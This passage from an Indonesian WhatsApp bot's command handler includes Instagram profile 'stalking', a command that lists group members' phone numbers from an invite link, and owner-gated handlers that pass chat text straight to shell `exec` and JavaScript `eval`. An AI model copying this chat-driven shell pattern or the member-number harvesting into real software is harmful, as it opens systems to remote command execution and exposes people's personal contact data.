          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          ronove.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;

      case "igstalk":
        if (!q) return reply("Usernamenya?");

        const tod = await fetchJson(

          `https://fdz-app.herokuapp.com/api/stalkig?username=${q}`

        );

        var nih_buff = await getBuffer(tod.picurl);

        const tt = `*INSTAGRAM STALK*

       \nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;

        ronove.sendMessage(from, nih_buff, image, { quoted: floc, caption: tt });

        break;
      case "fb":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        sticWait(from);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
        
      case "term":
      if (!mek.key.fromMe) return;
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`Khusus Owner 🗿:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
        try {
        	if (!isPremium && !isOwner) return sendButMessage (from, prem1, prem2, prem3, { quoted: fdoc})
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await ronove.acceptInvite(codeInvite);
          reply("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "ʀᴜɴᴛɪᴍᴇ":
      case "test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        fakegroup(teks);
        break;
      case "sᴘᴇᴇᴅ":
      case "ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          reply(pingnya);
        });
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await ronove.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await ronove.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://chat.whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await ronove.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          ronove.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
      case "eval":
        if (!mek.key.fromMe) return;
        ronove.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!isOwner)return// reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
if (!q)return 
var itsme = `${sender}`
var split = `*${namaowner}-BotWeA*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return ronove.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
ronove.sendMessage(from, stdout, text, term)
}
})
}

           default:
if (budy.toLowerCase() === `1998`){
		if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
	         try {
								ppimg = await ronove.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const anuu = `「 ᴘᴇɴᴅᴀғᴛᴀʀᴀɴ ᴜsᴇʀ 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*🌹 Nama :* ${pushname}
*🌹 API :* +${sender.split('@')[0]}
*🌹 Serial:* ${serialUser}
*🌹 Total:* ${_registered.length} Pengguna

*「 ᴅɪᴅɪɴʙᴏᴛ」*
`
         haitod = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
             buttons = [{buttonId: `menu`,buttonText:{displayText: `🏷️MENU`},type:1}]
              imageMsg = (await ronove.prepareMessageMedia(haitod, "imageMessage", { thumbnail: haitod, })).imageMessage
              buttonsMessage = {footerText:`Created by ${namaowner} シ︎`, imageMessage: imageMsg,
              contentText:`${anuu}`,buttons,headerType:4}
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{quoted: fdoc})
              ronove.relayWAMessage(prep)
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
            setTimeout( () => {
			ronove.updatePresence(from, Presence.composing)
			reply(`*Terimakasih Telah Terdaftar Di ${namabot}*`)
		}, 2000)
}
           
if (budy.startsWith("$ ")){
if (!mek.key.fromMe && !isOwner) return
console.log(color('[EXEC]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'red'), color(`DARI OWNER HEHE`))
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) reply(`${stdout}`)
})
}
if (budy.includes(`assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }
                  if (budy.includes(`${setting.namaowner2}`)) {
                  reply(`Auto respon: Iya kenapa manggil ownerku?`)
                  }
                  if (budy.includes(`${namaowner}`)) {
                  reply(`Auto respon: Iya kenapa manggil ownerku?`)
                  }


		if (budy.includes(`Assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }
                  
                  if (budy.includes(`syalom`)) {
                  reply(`waalaikumsalam`)
                  }           
           
     if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return ronove.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }
if (isGroup && budy != undefined) {
} else {
console.log(color('~','red'),color('> [','white'),color('TEXT','green'),']',`Pesan : ${budy} Dari`, color(pushname))
}		
   } catch (e) {
    e = String(e);// Fixed Di Consolog 〆⁩🦢
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// Sekian Dari Gw Assamualaikum 🙂
// 